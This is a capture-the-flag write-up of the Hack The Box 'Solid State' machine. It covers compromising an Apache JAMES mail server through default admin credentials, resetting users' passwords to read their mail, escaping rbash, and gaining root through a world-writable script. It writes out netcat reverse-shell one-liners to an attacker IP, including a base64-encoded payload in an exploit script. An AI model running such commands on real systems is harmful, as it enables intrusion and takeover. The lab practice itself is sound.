---
title: "Hack The Box - Solid State"
date: 2021-08-24T12:34:30-04:00
categories:
  - WriteUps
tags:
  - HackTheBox
  - WriteUps
---

# Introduction

---

The box is rated medium on hack the box. It should be a good practice for the OSCP, so I will try to hack it. It has a rating of 4.8, which is very good, so there is probably nothing to brute force etc. 

So let's jump in and start enumerating the box.

# Enumeration

---

## Nmap Scan

---

First, I perform a basic/fast nmap scan:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]                                                                                                                                                                                         
└─$ nmap solidstate.htb -vv -p-                                                                                                                                                                                                              
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 12:12 CEST                                                                                                                                                                             
Initiating Ping Scan at 12:12                                                                                                                                                                                                                
Scanning solidstate.htb (10.10.10.51) [2 ports]                                                                                                                                                                                              
Completed Ping Scan at 12:12, 0.02s elapsed (1 total hosts)                                                                                                                                                                                  
Initiating Connect Scan at 12:12                                                                                                                                                                                                             
Scanning solidstate.htb (10.10.10.51) [65535 ports]                                                                                                                                                                                          
Discovered open port 22/tcp on 10.10.10.51                                                                                                                                                                                                   
Discovered open port 25/tcp on 10.10.10.51                                                                                                                                                                                                   
Discovered open port 80/tcp on 10.10.10.51                                                                                                                                                                                                   
Discovered open port 110/tcp on 10.10.10.51                                                                                                                                                                                                  
Discovered open port 4555/tcp on 10.10.10.51                                                                                                                                                                                                 
Discovered open port 119/tcp on 10.10.10.51                                                                                                                                                                                                  
Completed Connect Scan at 12:12, 8.03s elapsed (65535 total ports)                                                                                                                                                                           
Nmap scan report for solidstate.htb (10.10.10.51)                                                                                                                                                                                            
Host is up, received syn-ack (0.044s latency).                                                                                                                                                                                               
Scanned at 2021-08-22 12:12:48 CEST for 8s                                                                                                                                                                                                   
Not shown: 65529 closed ports                                                                                                                                                                                                                
Reason: 65529 conn-refused                                                                                                                                                                                                                   
PORT     STATE SERVICE REASON                                                                                                                                                                                                                
22/tcp   open  ssh     syn-ack                                                                                                                                                                                                               
25/tcp   open  smtp    syn-ack                                                                                                                                                                                                               
80/tcp   open  http    syn-ack                                                                                                                                                                                                               
110/tcp  open  pop3    syn-ack                                                                                                                                                                                                               
119/tcp  open  nntp    syn-ack                                                                                                                                                                                                               
4555/tcp open  rsip    syn-ack                                                                                                                                                                                                               
                                                                                                                                                                                                                                             
Read data files from: /usr/bin/../share/nmap                                                                                                                                                                                                 
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```

To get more information, I do a deep port scan on those open ports I found above:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ nmap solidstate.htb -A -p 22,25,80,110,119,4555
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 12:13 CEST
Nmap scan report for solidstate.htb (10.10.10.51)
Host is up (0.031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello solidstate.htb (10.10.17.28 [10.10.17.28]), 
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4555-TCP:V=7.91%I=7%D=8/22%Time=61222365%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,7C,"JAMES\x20Remote\x20Administration\x20Tool\x202\.3\.2\nPl
SF:ease\x20enter\x20your\x20login\x20and\x20password\nLogin\x20id:\nPasswo
SF:rd:\nLogin\x20failed\x20for\x20\nLogin\x20id:\n");
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 261.77 seconds
```

## Enumerating Services

---

### Port 22

---

No need to enumerate this service because I would need some usernames to brute force the password. For this version of OpenSSH exist no exploit.

### Port 25/110/119

---

These is the email service. The name of the service is Apache James. For this version of the James Email service, there is an exploit, but only for the administration tool.

### Port 4555

---

On this port runs the JAMES Remote Administration Tool 2.3.2. There is a remote code execution vulnerability in this version of the tool.  It can be found here:

[Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/35513)

### Port 80

---

Here is the gobuster scan of the web server:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ gobuster dir -u http://solidstate.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://solidstate.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              log,txt,php,html
[+] Timeout:                 10s
===============================================================
2021/08/22 12:13:07 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 317] [--> http://solidstate.htb/images/]
/index.html           (Status: 200) [Size: 7776]                                   
/about.html           (Status: 200) [Size: 7183]                                   
/services.html        (Status: 200) [Size: 8404]                                   
/assets               (Status: 301) [Size: 317] [--> http://solidstate.htb/assets/]
/README.txt           (Status: 200) [Size: 963]                                    
/LICENSE.txt          (Status: 200) [Size: 17128]                                  
/server-status        (Status: 403) [Size: 302]
```

The .html files are rabbit holes. I will analyze the txt files. Here is README.txt:

```
Solid State by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)

After a somewhat extended break from HTML5 UP (to work on a secret-ish new project --
more on that later!) I'm back with a brand new design: Solid State, a slick new multi-
pager that combines some of the ideas I've played with over at Pixelarity with an "angular"
sort of look. Hope you dig it :)

Demo images* courtesy of Unsplash, a radtastic collection of CC0 (public domain) images
you can use for pretty much whatever.

(* = not included)

AJ
aj@lkn.io | @ajlkn

Credits:

	Demo Images:
		Unsplash (unsplash.com)

	Icons:
		Font Awesome (fortawesome.github.com/Font-Awesome)

	Other:
		jQuery (jquery.com)
		html5shiv.js (@afarkas @jdalton @jon_neal @rem)
		background-size polyfill (github.com/louisremi)
		Misc. Sass functions (@HugoGiraudel)
		Respond.js (j.mp/respondjs)
		Skel (skel.io)
```

The license file is just a Creative Commons Attribution 3.0 Unported License. The directories have some images and assets inside, but nothing that helps me any further.

# Exploitation

---

I will use the exploit found for the JAMES Remote Administration Tool 2.3.2. The download link is above ("Enumeration of Port 4555").

First, I generate a payload, I encoded it in base64 (Because it is in python and I do not want to have problems with the quotes etc.):

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.28 443 >/tmp/f' | base64 -w0
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTcuMjggNDQzID4vdG1wL2YK
```

Now, I edit the exploit script and change the payload line:

```python
payload = 'echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTcuMjggNDQzID4vdG1wL2YK" | base64 -d | bash'
```

Before running the exploit, I started a Netcat listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ python exploit.py solidstate.htb
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
```

That did not work, but the script used the default login credentials of the James Remote Administration Tool, which are `root:root`, so I will try to log in with these:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ nc solidstate.htb 4555                                             
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

That worked, but I can't do much here. I will reset the passwords for all user, so that I can check their accounts and emails later:

```bash
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```

Now I can log in to their email accounts. It's time to read through the emails stored on the server.

## Reading Emails via Telnet

---

I can read the emails via Telnet. User james & thomas do not have any emails. So I go on with john:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ telnet solidstate.htb 110
Trying 10.10.10.51...
Connected to solidstate.htb.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass password
+OK Welcome john
list
+OK 1 743
1 743
.
retr ^[
-ERR Usage: RETR [mail number]
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

The email says that mindy has access, so I login with the account of mindy:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]                                                                                                                                                                                         
└─$ telnet solidstate.htb 110                                                                                                                                                                                                                
Trying 10.10.10.51...                                                                                                                                                                                                                        
Connected to solidstate.htb.                                                                                                                                                                                                                 
Escape character is '^]'.                                                                                                                                                                                                                    
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready                                                                                                                                                                                   
user mindy                                                                                                                                                                                                                                   
+OK                                                                                                                                                                                                                                          
pass password                                                                                                                                                                                                                                
+OK Welcome mindy                                                                                                                                                                                                                            
list                                                                                                                                                                                                                                         
+OK 2 1945                                                                                                                                                                                                                                   
1 1109                                                                                                                                                                                                                                       
2 836                                                                                                                                                                                                                                        
.                                                                                                                                                                                                                                            
retr 1                                                                                                                                                                                                                                       
+OK Message follows                                                                                                                                                                                                                          
---snip---                                                                                                                                                                                                          
Subject: Welcome                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
Dear Mindy,                                                                                                                                                                                                                                  
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduc
tion to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.                 
                                                                                                                                                                                                                                             
We are looking forward to you joining our team and your success at Solid State Security.                                                                                                                                                     
                                                                                                                                                                                                                                             
Respectfully,                                                                                                                                                                                                                                
James                                                                                                                                                                                                                                        
.
retr 2                                                                                                                                                                                                                                       
+OK Message follows                                                                                                                                                                                                                          
---snip---
Subject: Your Access

Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

The email gives me some credentials `mindy:P@55W0rd1!2@`. The mailadmin account does not contain any emails.

## User Flag

---

I can now login with SSH and get the user flag:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]                                                                                                                                                                                         
└─$ ssh mindy@solidstate.htb                                                                                                                                                                                                                 
The authenticity of host 'solidstate.htb (10.10.10.51)' can't be established.                                                                                                                                                                
ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.                                                                                                                                                                 
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                                                                     
Warning: Permanently added 'solidstate.htb,10.10.10.51' (ECDSA) to the list of known hosts.                                                                                                                                                  
mindy@solidstate.htb's password:

mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt
05**************************0dc2
```

# Getting A Normal Shell

---

While logging in with SSH, I got many errors, these errors where caused by the payload I used earlier with the exploit script. So I logged out and started the netcat listener and logged in again. The Netcat listener got a shell:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ nc -lvnp 443                                                                                                                              
listening on [any] 443 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.51] 51954
$ whoami
mindy
$ pwd
/home/mindy
$ cd ..
$ ls
james
mindy
```

In this shell, I have more access rights as I had with SSH. First, I stabilized the shell with python:

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ export TERM=xterm
export TERM=xterm
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ ^Z
zsh: suspended  nc -lvnp 443

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ stty raw -echo; fg                                                                                                                                                                                                               1 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 443

${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$
```

So I have a better shell, but it is still netcat, so I use another method found on [hacknos.com](http://hacknos.com) to escape this rbash shell via SSH:

[](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ ssh mindy@solidstate.htb -t "bash --noprofile"                                                                                                                                                                                     127 ⨯
mindy@solidstate.htb's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ sudo
bash: sudo: command not found
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
mindy
```

I found another user called james, but it seems that he does not have any interesting files in (only .ssh but I have no permissions to go inside that directory), so I have to find a way do prives.

# Privilege Escalation

---

I used LinPEAS to find interesting files, and I found some world writeable files:

```bash
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                   
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                          
/dev/mqueue                                                                                                                                                                                                                                  
/dev/shm                                                                                                                                                                                                                                     
/home/mindy                                                                                                                                                                                                                                  
/opt/tmp.py                                                                                                                                                                                                                                  
/run/lock                                                                                                                                                                                                                                    
/run/user/1001                                                                                                                                                                                                                               
/run/user/1001/gnupg                                                                                                                                                                                                                         
/run/user/1001/systemd                                                                                                
/run/user/1001/systemd/transient                                                                                      
/tmp                                                                                                                  
/tmp/.font-unix                                                                                                       
/tmp/.ICE-unix                                                                                                                                                                                                                               
/tmp/.Test-unix                                                                                                                                                                                                                              
/tmp/.X11-unix                                                                                                                                                                                                                               
/tmp/.XIM-unix                                                                                                        
/var/tmp
```

The most interesting file is /opt/tmp.py:

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

This script clears temp, it may run as root, so I can use this as a privilege escalation. Netcat is installed on the machine, so I can use it to get a root shell. I edited it as follows:

```bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.28 4444 >/tmp/f')
except:
     sys.exit()
```

Save the file, and look at the nc listener:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.28] from (UNKNOWN) [10.10.10.51] 57852
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
#
```

## Root Flag

---

I got root access, so I can just `cat /root/root.txt`, but before doing this, I stabilize the shell:

```bash
# python -c 'import pty;pty.spawn("/bin/bash")'
root@solidstate:~# export TERM=xterm
export TERM=xterm
root@solidstate:~# ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                                                                                                                                             
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/solidstate]
└─$ stty raw -echo; fg                                                                                                                                                                                                             148 ⨯ 1 ⚙
[1]  + continued  nc -lvnp 4444

root@solidstate:~#
```

Now I can get the root flag:

```bash
root@solidstate:~# cat root.txt 
4f**************************953d
```

# Conclusions

---

To get initial access on this machine was not so difficult. But to find the privilege escalation took my a long time, but after finding it, it was a piece of cake to create the root reverse shell.

It was a fun box, I learned a lot of it, I definitely need to practice more privilege escalations.
